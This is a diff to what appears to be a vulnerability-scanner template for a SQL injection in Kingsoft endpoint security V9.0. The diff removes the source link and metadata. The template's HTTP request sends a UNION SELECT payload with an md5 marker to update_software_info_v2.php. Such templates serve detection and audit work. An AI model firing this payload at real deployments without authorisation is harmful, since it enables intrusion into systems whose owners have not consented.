@@ -3,12 +3,8 @@ info:
   name: 金山终端安全系统V9.0 SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/xleccrxw1i1sqr0m'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: xleccrxw1i1sqr0m
-    fofa: 暂无
 http:
 - raw:
   - 'POST /inter/update_software_info_v2.php HTTP/1.1
@@ -24,8 +20,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     type=-100+UNION+SELECT+1,md5(078674232),1,1,1,1,1,1--&key=&pageCount=0&curPage=
